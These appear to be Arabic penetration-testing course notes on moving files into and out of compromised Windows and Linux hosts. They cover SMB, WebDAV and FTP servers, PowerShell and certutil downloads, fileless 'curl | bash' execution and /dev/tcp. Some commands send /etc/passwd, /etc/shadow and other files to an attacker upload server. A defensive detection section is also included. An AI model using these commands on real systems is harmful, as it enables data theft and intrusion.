# Layer 1
## **1️⃣ التحديات اللي واجهناها**

- **PowerShell محظور:** بسبب Application Control Policy، ماقدرناش ننقل سكريبت PowerUp.ps1 بسهولة.
    
- **الوصول للويب محدود:** مواقع زي GitHub وDropbox وGoogle Drive محجوبة بفلترة الشبكة.
    
- **FTP محجوب:** حركة المرور على TCP port 21 محجوبة، يعني نقل الملفات عبر FTP التقليدي مش ممكن.
    
- **الحاجة لأداة للرفع:** الهدف النهائي هو رفع أداة **PrintSpoofer** لاستغلال صلاحيات SeImpersonatePrivilege.
    

---

## **2️⃣ الحلول البديلة اللي استخدمناها**

- **SMB (Server Message Block) عبر TCP 445:**
    
    - استخدمنا أداة **Impacket smbserver** لإنشاء مجلد ومشاركة الملفات.
        
    - هذا البروتوكول كان مسموح بالخروج من الشبكة، وبالتالي قدرنا ننقل الملف بسهولة.
        
- **الأدوات المحلية:** رفعنا Web Shell أولًا ثم reverse shell للسيطرة على الجهاز.
    

---

## **3️⃣ الدروس المستفادة**

1. **كن على دراية بالقيود:** قيود النظام (App Whitelisting، AV، EDR) وقيود الشبكة (Firewall، IDS/IPS) تؤثر على طرق النقل.
    
2. **أدوات متعددة لنفس المهمة:** لا تعتمد على أداة واحدة، جرب طرق مختلفة (PowerShell، FTP، SMB، Certutil، Wget، Curl…).
    
3. **الإلمام بالبروتوكولات:** معرفة أي بروتوكولات مسموح بها على الشبكة يمكن استغلالها (TCP 445 SMB، HTTP، HTTPS…).
    
4. **الاستفادة من الأدوات المتاحة:** استخدام الأدوات المثبتة مسبقًا على النظام قدر الإمكان.
    
5. **التجربة العملية:** العمل على بيئة اختبارية أو Sandbox قبل محاولة النقل على الهدف الحقيقي.
    

---

## **4️⃣ أبرز طرق نقل الملفات في بيئة محدودة**

|الطريقة|البروتوكول/الأداة|ملاحظات|
|---|---|---|
|PowerShell Invoke-WebRequest / DownloadFile|HTTP/HTTPS|قد يتم حظره|
|Certutil|HTTP/HTTPS|قد يتم حظره، يستخدم عادة لتحميل ملفات بصيغة Base64|
|FTP|TCP 21|محجوب في هذا المثال|
|SMB share|TCP 445|مفيد إذا كان مسموح بالخروج على الشبكة|
|SFTP / SCP|TCP 22|يعتمد على السماح بالـ SSH|
|Web Shell upload|HTTP POST|يحتاج RCE أولي|
|Curl / Wget|HTTP/HTTPS|يحتاج فتح البروتوكولات|

-------------

# Layer 2
## **طرق نقل الملفات في ويندوز (Windows File Transfer Methods)**

### **مقدمة**

الويندوز اتطور جدًا في السنين الأخيرة، وكل نسخة جديدة بتجيب أدوات جديدة لنقل الملفات. فهم طرق نقل الملفات مهم لأي حد سواء كان:

- **الهاكر/المهاجم**: علشان يعرف يستخدم طرق مختلفة لنقل الملفات وتنفيذ هجماته من غير ما يتكشف.
    
- **المدافع/الدفاع**: علشان يعرف المهاجم ممكن يعمل إيه ويقدر يحمي النظام ويعمل سياسات تمنع أي اختراق.
    

كمثال عملي، فيه حاجة اسمها **Astaroth Attack**، ده هجوم متطور (APT) واتعملت عليه دراسة في مدونة Microsoft.

---

### **الهجمات اللي من غير ملفات (Fileless Threats)**

- "Fileless" يعني إن الهجوم **مش بييجي في ملف تقليدي**، لكنه بيستخدم أدوات أصلية موجودة في النظام علشان ينفذ الهجوم.
    
- ده مش معناه إن مفيش نقل ملفات خالص، لكن الملفات **مش بتتحفظ على الهارد، بتشتغل في الذاكرة (RAM)**.
    

#### **مثال Astaroth**

1. شخص بيبعتلك **إيميل صيد (spear-phishing)** فيه لينك خبيث.
    
2. لما تضغط على اللينك، ملف **LNK** بيتنفذ.
    
3. الملف ده بيشغل أداة **WMIC** مع باراميتر `/Format`، واللي بيخلي الهجوم ينزل **كود JavaScript خبيث**.
    
4. الكود ده بيستخدم أداة **Bitsadmin** لتحميل الـpayloads.
    
5. الـpayloads بتكون **مشفرة Base64**، وبعدين بتتفك باستخدام **Certutil**، ودي بتنتج ملفات DLL.
    
6. أداة **regsvr32** بتستخدم لتحميل DLLs دي، لحد ما الهجوم النهائي **Astaroth** يتحط جوه **Userinit process**.
    
![[fig1a-astaroth-attack-chain.webp]]
يعني الهجوم ده مثال ممتاز على استخدام أدوات أصلية في الويندوز لنقل وتشغيل ملفات بطريقة ذكية من غير ما يظهر ملف واضح على الجهاز.

---

## **طرق تحميل الملفات (Download Operations)**

لو إحنا عايزين ننقل ملف من جهازنا (Pwnbox) لجهاز ويندوز (MS02)، في طرق مختلفة:

---

### **1. PowerShell Base64 Encode & Decode**

- ممكن تشفر أي ملف لـ **Base64**، تنسخه وتلصقه على جهاز تاني، وتفك تشفيره هناك.
    
- علشان تتأكد إن الملف اتنقل صح، ممكن تستخدم **md5sum** علشان تحسب الـhash.
    

#### مثال لنقل مفتاح SSH:

1. على الـPwnbox:
    

`md5sum id_rsa cat id_rsa | base64 -w 0; echo`

2. على ويندوز:
    

`[IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("<base64 content>")) Get-FileHash C:\Users\Public\id_rsa -Algorithm md5`

- ملحوظة: الـcmd.exe فيه حد أقصى لطول السلسلة (8191 حرف)، لو الملف كبير جدًا الطريقة دي ممكن تفشل.
    

---

### **2. PowerShell Web Downloads**

- معظم الشركات بتسمح بحركة HTTP/HTTPS علشان الموظفين يشتغلوا. ده ممكن نستغله لتحميل الملفات.
    
- PowerShell فيها **WebClient class**، اللي بتديك طرق مختلفة:
    
    - `DownloadFile` لتحميل ملف وحفظه على الهارد
        
    - `DownloadString` لتحميل النص وتشغيله مباشرة (Fileless)
        
    - والنسخ Async اللي بتشتغل من غير ما توقف البرنامج
        

![[Pasted image 20250907143038.png]]

#### مثال DownloadFile:

`(New-Object Net.WebClient).DownloadFile('https://example.com/file.ps1','C:\Users\Public\file.ps1')`

#### مثال Fileless:

`IEX (New-Object Net.WebClient).DownloadString('https://example.com/script.ps1')`

- `IEX` = **Invoke-Expression**، بتشغل الكود مباشرة في الذاكرة من غير ما تحفظه على القرص.
    

#### Invoke-WebRequest

- متاح من PowerShell 3.0، أبطأ شوية من WebClient.
    

`Invoke-WebRequest https://example.com/file.ps1 -OutFile file.ps1`

- لو ظهرلك خطأ بسبب Internet Explorer:
    
![[Pasted image 20250907143148.png]]

`Invoke-WebRequest https://example.com/file.ps1 -UseBasicParsing | IEX`

- لو ظهر خطأ SSL/TLS:
    

`[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}`

---

### **3. SMB Downloads**

- بروتوكول SMB بيشتغل على **TCP/445**، وبيستخدم في شبكات الشركات لنقل الملفات.
    
- ممكن نعمل **SMB server** على Pwnbox ونستخدم `copy` أو `PowerShell Copy-Item` لتحميل الملفات.
    

#### مثال:

`sudo impacket-smbserver share -smb2support /tmp/smbshare`

- لو النسخة الجديدة من ويندوز تمنع **unauthenticated guest access**، ممكن نعمل Server باسم مستخدم وباسورد:
    

`sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test`
![[Pasted image 20250907143255.png]]
- على ويندوز:
    
![[Pasted image 20250907143304.png]]

`net use n: \\192.168.220.133\share /user:test test copy n:\nc.exe`

---

### **4. FTP Downloads**

- FTP بيشتغل على **TCP/21 و20**. ممكن تستخدم عميل FTP أو PowerShell WebClient.
    
- ممكن نعمل FTP server على Pwnbox باستخدام `pyftpdlib`:
    

`sudo pip3 install pyftpdlib sudo python3 -m pyftpdlib --port 21`

- على ويندوز:
    

`(New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt','C:\Users\Public\ftp-file.txt')`

- أو نستخدم **FTP command file** لتحميل الملف لو shell مش interactive.
    

---

## **طرق رفع الملفات (Upload Operations)**

نفس الطرق اللي استخدمناها للتحميل ممكن نستخدمها للرفع، مع بعض التعديلات:

### **1. PowerShell Base64 Encode & Decode**

- على ويندوز:
    

`$b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\system32\drivers\etc\hosts' -Encoding Byte))`

- على Pwnbox:
    

`echo <base64> | base64 -d -w 0 > hosts`

### **2. PowerShell Web Uploads**

- PowerShell مش فيها upload function جاهزة، لكن نقدر نستخدم `Invoke-RestMethod` مع webserver يقبل رفع الملفات.
    
- مثال: Python `uploadserver`
    

`pip3 install uploadserver python3 -m uploadserver`

- على ويندوز:
    

`Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\Windows\System32\drivers\etc\hosts`

### **3. SMB Uploads**

- عادة الشركات ما بتسمحش بـSMB برا الشبكة الداخلية.
    
- بديل: استخدام **SMB over HTTP** مع **WebDav**. WebDav بيسمح لـwebserver يشتغل كـfileserver ويدعم HTTPS.![[smb-webdav-wireshark.webp]]

### 1️⃣ WebDAV باستخدام Python

- **تثبيت المكتبات:**
    

`sudo pip3 install wsgidav cheroot`

- **تشغيل سيرفر WebDAV:**
    

`sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous`

- التحذيرات المهمة:
    
    - السيرفر يسمح بالكتابة والقراءة بدون authentication → خطورة كبيرة لو على شبكة مفتوحة.
        
    - SSL مش مفعل → كل البيانات هتبقى plain text.
        
- **الاتصال بالسيرفر من Windows:**
    

`dir \\192.168.49.128\DavWWWRoot`

> ملاحظة: `DavWWWRoot` keyword خاص بالـWindows Mini-Redirector وبيمثل root السيرفر. لو عايز تتعامل مع فولدر محدد استخدم المسار الحقيقي: `\\192.168.49.128\sharefolder`

- **رفع ملفات:**
    

`copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\sharefolder\`

---

### 2️⃣ SMB (Windows File Share)

- طريقة مشابهة للـWebDAV لكن باستخدام بروتوكول SMB/TCP445:
    

`copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\sharefolder\`

> ملاحظة: ممكن تستخدم **impacket-smbserver** لو محتاج تبني سيرفر SMB على جهازك.

---

### 3️⃣ FTP Upload باستخدام Python وPowerShell

- **تشغيل سيرفر FTP على Linux:**
    

`sudo python3 -m pyftpdlib --port 21 --write`

- التحذير: write permissions للـanonymous → الجميع يقدر يرفع ملفات.
    
- **رفع ملفات باستخدام PowerShell:**
    

`(New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')`

- **أو باستخدام Command File لـftp:**
    

`echo open 192.168.49.128 > ftpcommand.txt echo USER anonymous >> ftpcommand.txt echo binary >> ftpcommand.txt echo PUT c:\windows\system32\drivers\etc\hosts >> ftpcommand.txt echo bye >> ftpcommand.txt ftp -v -n -s:ftpcommand.txt`

---

### ✅ خلاصة

1. **WebDAV**: سهل، يدعم anonymous، مناسب لرفع ملفات سريعة لكن بدون تشفير.
    
2. **SMB**: native Windows share، يحتاج TCP 445 مفتوح.
    
3. **FTP**: مرن، ممكن تعمل سكريبتات أو رفع من PowerShell، لكن anonymous خطر.
    

---------
# Layer 3

المقال اللي بعتته بيتكلم عن **طرق نقل الملفات على لينوكس** — وده موضوع مهم سواء كـهاكر أخلاقي (في منصّات زي HTB) أو كـمحترف دفاع. الطرق دي بتشمل: تحويل لقاعدة64، استخدام `wget`/`curl`، تشغيل سكربتات "بلا فايل" عبر بايب، استخدام `/dev/tcp` في bash، استخدام `scp/ssh`، ورفع/تحميل عن طريق سيرفر ويب بسيط (python/php/ruby) أو أداة اسمها `uploadserver`.

خلي بالك: الحاجات دي **ثنائية الاستعمال** — ممكن تتعلمها لأغراض شرعية/تعليمية أو لاختبار اختراق بترخيص. متستخدمهاش على أي أنظمة مش ليك أو من غير إذن.

---

## 1) MD5 / التحقق من الملفات (ليه؟)

في الأول بيحسبوا `md5sum id_rsa` علشان يضمنوا إن الملف اتنقل مظبوط — الـ MD5 هو **بصمة** للملف. لو عملت md5 قبل وبعد النقل ولاحظت نفس القيمة، الملف نقل بدون فساد.

الأمر:

`md5sum id_rsa # يطبع: 4e30175...  id_rsa`
![[Pasted image 20250923195657.png]]


لو القيمة نفسها على الجهتين يعني الملف متطابق.

---

## 2) Base64 Encoding/Decoding — لما الشبكة مش متاحة

الفكرة: تحول الملف لسلسلة نصية (text) عن طريق `base64`، تنسخ السطر ده على الجهاز التاني، وتعمل decode. مفيد لملفات صغيرة أو لما مفيش طريقة نقل شبكي.

أوامر المهمة وشرح كل جزء:

1. تشفير:
    

`cat id_rsa | base64 -w 0; echo`

- `cat id_rsa` -> يطبع محتوى الملف.
    
- `|` -> يمرر الناتج للأمر اللي بعده (pipe).
    
- `base64 -w 0` -> يحوله لسطر واحد (بدون كسور أسطر). 
- `-w 0` يعني ما يعملش line-wrap.
- (لو مفيش `-w`, base64 هيكسر النص كل 76 حرف).
    
- `; echo` -> يطبع سطر جديد بعد السطر الطويل علشان يسهل النسخ.
    

2. فك التشفير على الجهاز التاني:
    

`echo -n 'BASE64STRING' | base64 -d > id_rsa`

- `echo -n` -> يطبع السلسلة بدون إضافة newline في آخرها (مهم علشان `base64 -d` ميغالطش).
    
- `| base64 -d` -> يفك التشفير.
    
- `> id_rsa` -> يكتب الناتج لملف `id_rsa`.
    

3. التحقق:
    

`md5sum id_rsa # يقارنوا بالقيمة الأصلية`

**ملاحظات عملية وأمنية:**

- Base64 
- يزيد الحجم ~33%، فمش مناسب لملفات كبيرة.
    
- لو الملف فيه مفاتيح/حسّاسيات، نسخة النص ممكن تترسب في shell history أو في clipboard — خليك حذر.
    
- الطريقة دي تعمل حتى لو مفيش اتصال شبكي.
    

---

## 3) wget و curl — التنزيل من الويب

أكتر الأدوات انتشارًا لتنزيل ملفات عبر HTTP/HTTPS.

- `wget`:
    

`wget https://example.com/script.sh -O /tmp/script.sh`

`-O` (uppercase O) تحدد اسم الملف الناتج (output file).

- `curl`:
    

`curl -o /tmp/script.sh https://example.com/script.sh`

`-o` (lowercase) بنفس معنى `-O` في wget.

**الفرق العملي:**

- wget
- مخصص لتنزيل ملفات ويقدر يعمل retry، resume، تحميلات متوازية (مع شوية خيارات).
    
- curl
- مرن أكتر في التعامل مع HTTP headers, requests, POST, authentication، وبيستخدم كثير في السكربتات.
    

---

## 4) Fileless execution — تنفيذ من غير حفظ ملف على القرص

الفكرة: بدل ما تحفظ السكربت وتنفذه، بتنزل المحتوى وتوصّله مباشرة لمفسر (مثل `bash` أو `python`) عبر pipe.

أمثلة:

- تنفيذ shell script مباشرة:
    

`curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash`

- تنفيذ بايثون مباشر:
    

`wget -qO- https://.../helloworld.py | python3`

`-qO-` في wget: `-q` quiet (بدون أي output)، `-O -` يعني اكتب الناتج على STDOUT عشان يتم توجيهه للـ pipe.

**مزايا:**

- مايتخزنش ملف على الديسك (ظاهريًا).
    
- أسرع، مناسب لهجمات "بلا فايل" أو أدوات جمع بيانات مؤقتة.
    

**عيوب/مخاطر:**

- قد تخلق ملفات مؤقتة داخليًا (بعض الأوامر تعمل temp files).
    
- يعتبر مؤشر قوي على نشاط خبيث، وسهل تكتشفه لو بتراقب exec of network-connected processes.
    

---

## 5) Download with Bash using /dev/tcp — لما الأدوات مش موجودة

لو `curl` و`wget` مش موجودين، وبشير المقال إن فيه طريقة باستخدام خاصية shell `net redirections` (موجودة في bash لو متبناة).

الخطوات الأساسية:

`exec 3<>/dev/tcp/10.10.10.32/80 echo -e "GET /LinEnum.sh HTTP/1.1\n\n" >&3 cat <&3`

شرح:

- `/dev/tcp/host/port` -> ميزة في bash تفتح socket لعنوان و port.
    
- `exec 3<>/dev/tcp/...` -> يفتح file descriptor رقم 3 متصل بالسيرفر.
    
- `echo -e "GET /path HTTP/1.1\n\n" >&3` -> يكتب طلب HTTP عبر الوصلة.
    
- `cat <&3` -> يقرأ الرد ويطبعه.
    

**ملاحظات:**

- الرد هيشمل headers و body؛ لازم تعالج النص علشان تستخلص الـ body فقط.
    
- مش كل توزيعة bash مُمكَّنة من net-redirections، وبعض الأنظمة تمنعها من الكومبايل.
    

---

## 6) SSH / SCP — نقل آمن عبر SSH

SSH بيستخدم تشفير، 
وبيوفر `scp` و `sftp` للنقل.

أمثلة:

- تنزيل ملف من هدف لك:
    

`scp user@192.168.49.128:/root/myroot.txt .`

- رفع ملف للهدف:
    

`scp /etc/passwd user@10.0.0.2:/home/user/`

شرح الصيغة:

- `scp [localfile] user@host:/remotepath` أو العكس `
- `scp user@host:/remotepath localpath`.
    
- لازم credentials (باسورد أو مفتاح خصوصي).
    

تشغيل SSH server على المهاجم (Pwnbox) علشان الهدف يقدر يرفع ملفات ليه:

`sudo systemctl enable ssh sudo systemctl start ssh netstat -lnpt  # للتأكد إن الـ ssh بيستمع على port 22`

**نقطة أمنة:** حاول تعمل حساب مؤقت في الهدف بدل ما تستخدم حساب رئيسي، وخليك حذر من بقاء مفاتيح خصوصية في الأنظمة.

---

## 7) إنشاء سيرفر ويب بسرعة (HTTP file serving)

لو عايز تنزل ملفات من الجهاز بتاعك للهدف أو العكس، أسهل طريقة عمل "mini web server" في مجلد:

- Python3:
    

`python3 -m http.server 8000 # يخدم الملف في current directory على بورت 8000`

- Python2:
    

`python2.7 -m SimpleHTTPServer 8000`

- PHP:
    

`php -S 0.0.0.0:8000`

- Ruby:
    

`ruby -run -ehttpd . -p8000`

ومن ثم على الجهاز الآخر:

`wget 192.168.49.128:8000/filetotransfer.txt`

**ملاحظات عملية:**

- كثير من الشبكات تمنع inbound traffic؛ لو السيرفر بتاعك وراه NAT لازم تتأكد من الوصولية.
    
- لما تشغّل سيرفر، بتعرض مجلدك للعالم لو الشبكة مفتوحة — كن حذر.
    

---

## 8) رفع ملفات عن طريق Web Upload / uploadserver

المقال ذكر أداة `uploadserver` (بايثون) اللي بتوفر صفحة ويب للرفع وبتدعم HTTPS.

تثبيت:

`sudo python3 -m pip install --user uploadserver`

إنشاء شهادة مُوقعة ذاتيًا (self-signed):

`openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'`

تشغيل السيرفر:

`mkdir https && cd https sudo python3 -m uploadserver 443 --server-certificate ~/server.pem # هتلاقي صفحة رفع على /upload`

من الهدف ترفع ملفات:

`curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure`

- `-F 'files=@/etc/passwd'` -> يضيف ملف للـ multipart/form-data upload.
    
- `--insecure` -> يتجاهل تحقق الشهادة (لأنها self-signed).
    

**ملاحظات أمنية:**

- `--insecure` بتخلي الإتصال مش موثوق — بس لو انت واثق بالشهادة الذاتية ده مقبول للتجارب.
    
- استضافة شهادة في نفس مجلد الويب غير مطلوب ولكن المشورة كانت "لا تستضيف السيرفر الشهادة" — يعني لا تترك server.pem في مجلد الجرّاح accessible للعامة.
    

---

## 9) SCP upload example (تكرار بس مع توضيح)

`scp /etc/passwd htb-student@10.129.86.90:/home/htb-student/ # بعدها يدخل الباسورد`

هي نفس فكرة `cp` لكن مع remote syntax `user@host:path`.

---

## 10) ملخص مميزات وعيوب كل طريقة

- **Base64 (نسخ ولصق عبر التيرمينال)**
    
    - ميزات: لا يحتاج شبكة، مناسب لملفات صغيرة.
        
    
    - عيوب: غير عملي للكبير، يترك أثار بالhistory/clipboard.
        
- **wget / curl**
    
    - ميزات: سريع، مرن، موجود على معظم الأنظمة.
        
    
    - عيوب: مراقب سهل من خلال عمليات الشبكة أو عمليات exec.
        
- **Fileless via pipe**
    
    - ميزات: لا ملف على القرص عادةً، سريع.
        
    
    - عيوب: مؤشر خبيث واضح، بعض payloads بتخلق temp files.
        
- **/dev/tcp (bash)**
    
    - ميزات: يفيد لو الأدوات مش موجودة.
        
    
    - عيوب: الرد بيبقى مع رؤوس الـ HTTP ومحتاج معالجة؛ مش دايمًا متاح.
        
- **SSH/SCP**
    
    - ميزات: آمن ومشفر، مناسب لنقل حساسيات.
        
    
    - عيوب: يحتاج credentials وport 22 مفتوح.
        
- **Mini webserver (python/php/ruby)**
    
    - ميزات: سهل جداً تنشر ملفات.
        
    
    - عيوب: بيكشف مسارات، ممكن يكون بلوك على الشبكة.
        
- **uploadserver**
    
    - ميزات: صفحة رفع جاهزة، يدعم HTTPS.
        
    
    - عيوب: يحتاج تثبيت وبورتات مفتوحة.
        

---

## 11) ازاي تكتشف وتمدّ دفاع (Defensive detections & mitigations)

لو أنت في دور الدفاع، دول الحاجات اللي تراقبها أو تعملها:

1. **Egress filtering / firewall**
    
    - امنع أو قيد الوصول الخارجي (HTTP/HTTPS) للأجهزة اللي مش مفروض تتصل بالإنترنت. سمّوها قاعدة allow-list وبس.
        
2. **Monitoring network traffic**
    
    - راقب اتصالات خارجة على بورتات غير متوقعة، وHTTP requests الى domains مش معروفة. IDS/IPS ممكن يكتشف patterns.
        
3. **Process auditing**
    
    - راقب عمليات exec لـ `curl`, `wget`, `python`, `bash` من حسابات غير متوقعة. استخدم `auditd` أو osquery.
        
4. **File integrity / hashing**
    
    - راجع الـ md5/sha للمفاتيح أو الملفات الحساسة دورياً.
        
5. **Disable unnecessary tools**
    
    - لو الخوادم مش محتاجة `wget`/`curl`، فكر تشيلهم أو تحصر استخدامهم عن طريق sudoers.
        
6. **Least privilege**
    
    - الحسابات لا تملك صلاحية root إلا عند الحاجة؛ استخدم accounts مؤقتة لعمليات النقل.
        
7. **Inspect webserver logs**
    
    - لو لقيت `/upload` hits، اعمل تحقيق فوري.
        
8. **Detect fileless exec**
    
    - راقب أنماط command lines زي `curl https://... | bash` أو `wget -qO- ... | python3`.
        
9. **Whitelist domains**
    
    - لو الأجهزة بتحتاج تنزيل تحديثات من مصادر محددة، اعمل whitelist للدومينات الرسمية بس.
        
10. **Alert on self-signed certs / --insecure usage**
    

- تحذيرات عند استعمال certs ذاتية التوقيع أو تجاهل الشهادات.
    

---

## 12) أوامر تشيت شيت سريعة للاستعمال/التجربة في مختبرك (انسخها بس على بيئتك المحلية)

(للأغراض التعليمية فقط)

```shell
# حساب md5
md5sum id_rsa

# base64 encode (one-liner)
cat id_rsa | base64 -w 0; echo

# base64 decode
echo -n 'BASE64STRING' | base64 -d > id_rsa

# wget download
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh

# curl download
curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh

# fileless execution with curl
curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash

# fileless execution with wget + python
wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3

# bash /dev/tcp
exec 3<>/dev/tcp/10.10.10.32/80
echo -e "GET /LinEnum.sh HTTP/1.1\nHost: 10.10.10.32\n\n" >&3
cat <&3

# start a simple python http server
python3 -m http.server 8000

# uploadserver (install+run)
python3 -m pip install --user uploadserver
openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
python3 -m uploadserver 443 --server-certificate ~/server.pem

# scp (download from remote)
scp user@192.168.49.128:/root/myroot.txt .

# scp (upload)
scp /etc/passwd user@10.129.86.90:/home/user/

```

---
# Layer 4

## مقدمة سريعة

المقطع ده بيتكلم عن إن معظم الأجهزة اللي هنستهدفها غالبًا هتلاقي عليها لغات برمجة زي **Python, PHP, Perl, Ruby, JavaScript, VBScript**، وممكن نستخدم اللغات دي عشان **تنزيل ملفات، رفع ملفات، أو تنفيذ أوامر**. كل لغة ليها طرق تنفيذ “one-liners” من الشيل عشان تشتغل بسرعة في بيئة اختراق/CTF.

> تحذير: الحاجات دي ثنائية الاستعمال — اتعلمها للتجارب الشرعية أو التمرين، وممنوع تستخدمها على أنظمة مش بتاعتك.

---

## Python

أكتر حاجة هتقابلها على لينوكس. تقدر تشغّل أوامر سطرية قصيرة بـ `-c`.

- **Python2 (قديم)** — تنزيل:
    

```bash
python2.7 -c 'import urllib; urllib.urlretrieve("https://.../LinEnum.sh", "LinEnum.sh")'
```

- **Python3 (حديث)** — تنزيل:
    

```bash
python3 -c 'import urllib.request; urllib.request.urlretrieve("https://.../LinEnum.sh","LinEnum.sh")'
```

- **طباعة المحتوى بدون حفظ** (زي `wget -qO-`):
    

```bash
python3 -c 'import urllib.request; print(urllib.request.urlopen("http://<IP>/flag.txt").read().decode())'
```

- **لتجاهل SSL self-signed**:
    

```bash
python3 -c 'import urllib.request, ssl; ctx=ssl._create_unverified_context(); print(urllib.request.urlopen("https://<IP>/file", context=ctx).read().decode())'
```

**مزايا**: موجودة على معظم الأنظمة، مرنة، مناسبة للـ fileless execution.  
**عيوب**: محتاجة المكتبات أحيانًا، والتشغيل المباشر خطر لو مش بتراجع المحتوى قبل التنفيذ.

---

## PHP

غالبًا على سيرفرات الويب. تقدر تشغّله من الشيل بـ `php -r`.

- **file_get_contents + file_put_contents**:
    

```bash
php -r '$file = file_get_contents("https://.../LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'
```

- **fopen / fread / fwrite (لتحميل متقطع)**:
    

```bash
php -r 'const BUFFER=1024; $fremote=fopen("https://.../LinEnum.sh","rb"); $flocal=fopen("LinEnum.sh","wb"); while($buffer=fread($fremote,BUFFER)) { fwrite($flocal,$buffer);} fclose($flocal); fclose($fremote);'
```

- **file to pipe (تشغيل مباشر)**:
    

```bash
php -r '$lines=@file("https://.../LinEnum.sh"); foreach($lines as $line) { echo $line; }' | bash
```

> ملاحظة: لازم `allow_url_fopen` يبقى مفعل في إعدادات PHP علشان `file_get_contents` أو `file()` تشتغل على URL.

**مزايا**: لو السيرفر ويب معمول بـ PHP، دايمًا خيار جاهز.  
**عيوب**: أحيانًا `allow_url_fopen` معطل، أو PHP مش موجود.

---

## Ruby

همهاش كتير، لكن ممكن تعمل تنزيل بكمان سطر:

```bash
ruby -e 'require "net/http"; File.write("LinEnum.sh", Net::HTTP.get(URI.parse("https://.../LinEnum.sh")))'
```

---

## Perl

لو موجود على الجهاز، تقدر تستخدم `LWP::Simple`:

```bash
perl -e 'use LWP::Simple; getstore("https://.../LinEnum.sh", "LinEnum.sh");'
```

---

## JavaScript (على ويندوز)

مش على لينوكس بنفس الشكل، لكن على ويندوز تقدر تستخدم `cscript.exe` مع ActiveX:

`wget.js` محتواه:

```javascript
var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
WinHttpReq.Open("GET", WScript.Arguments(0), false);
WinHttpReq.Send();
BinStream = new ActiveXObject("ADODB.Stream");
BinStream.Type = 1;
BinStream.Open();
BinStream.Write(WinHttpReq.ResponseBody);
BinStream.SaveToFile(WScript.Arguments(1));
```

تشغيل:

```cmd
cscript.exe /nologo wget.js https://.../PowerView.ps1 PowerView.ps1
```

---

## VBScript (ويندوز)

مشابه JS بس باستخدام `Microsoft.XMLHTTP` و `Adodb.Stream`.

`wget.vbs`:

```vbscript
dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
dim bStrm: Set bStrm = createobject("Adodb.Stream")
xHttp.Open "GET", WScript.Arguments.Item(0), False
xHttp.Send
with bStrm
    .type = 1
    .open
    .write xHttp.responseBody
    .savetofile WScript.Arguments.Item(1), 2
end with
```

تشغيل:

```cmd
cscript.exe /nologo wget.vbs https://.../PowerView.ps1 PowerView2.ps1
```

---

## Uploads باستخدام Python (requests)

لو عايز ترفع ملف لـ uploadserver أو سيرفر ويب يقبل رفع:

- بدء uploadserver (من المهاجم/Pwnbox):
    

```bash
python3 -m uploadserver
# بيهيئ صفحة /upload على port 8000
```

- رفع ملف بواحد-لاينر Python requests:
    

```bash
python3 -c 'import requests; requests.post("http://192.168.49.128:8000/upload", files={"files":open("/etc/passwd","rb")})'
```

**شرح مبسّط**:

```python
import requests
url = "http://192.168.49.128:8000/upload"
file = open("/etc/passwd","rb")
r = requests.post(url, files={"files": file})
```

**ملاحظات**:

- محتاج مكتبة `requests` منصبة (`pip install requests`).
    
- لو السيرفر https وشهادة غير موثوقة، تضيف `verify=False`.
    

---

## Fileless execution & pipes (مكرر لكن مهم)

الفكرة: بدل تحميل الملف وحفظه، نجيب المحتوى ونوصّله مباشرة لمفسر:

```bash
php -r '...download...' | bash
curl https://.../script.sh | bash
wget -qO- https://.../script.py | python3
```

**خطر**: بتنفّذ كود خارجي بدون مراجعته — ده أسوأ حاجة ممكن تعملها من ناحية أمان.

---

## نقاط فنية مهمة (pitfalls و gotchas)

- **Allow URL fopen** في PHP: لو معطل، طرق الـ `file_get_contents("http://...")` مش هتشتغل.
    
- **الشهادات SSL**: لو self-signed، المنع الافتراضي هيحصل — في Python تقدر تعمل unverified context، وفي requests تعمل `verify=False`.
    
- **Permissions**: لو بتحاول تحفظ ملف في مكان محمي (مثل `/` أو `/root`)، مش هتقدر إلا لو عندك صلاحيات.
    
- **توابع/مكتبات مش موجودة**: مثال `LWP::Simple` في Perl أو `requests` في Python ممكن مش يكونوا منصبين.
    
- **Network egress**: بعض الأنظمة تمنع الاتصال الخارجي؛ لازم تتأكد إن البورت مفتوح للـ outbound.
    
- **Output encoding**: لما تطبع محتوى بايناري أو مفتاح، اهتم بالـ binary mode.
    

---

## Cheat-sheet أوامر جاهزة (انسخ وجرب في مختبر)

```bash
# Python3 download and save
python3 -c 'import urllib.request; urllib.request.urlretrieve("http://<IP>/file","/tmp/file")'

# Python3 print direct
python3 -c 'import urllib.request; print(urllib.request.urlopen("http://<IP>/flag.txt").read().decode())'

# PHP download one-liner
php -r '$file = file_get_contents("https://.../LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'

# PHP pipe to bash
php -r '$lines=@file("https://.../LinEnum.sh"); foreach($lines as $line) echo $line;' | bash

# Ruby download
ruby -e 'require "net/http"; File.write("LinEnum.sh", Net::HTTP.get(URI.parse("https://.../LinEnum.sh")))'

# Perl download
perl -e 'use LWP::Simple; getstore("https://.../LinEnum.sh", "LinEnum.sh");'

# Start uploadserver (Pwnbox)
python3 -m uploadserver

# Upload file with Python requests
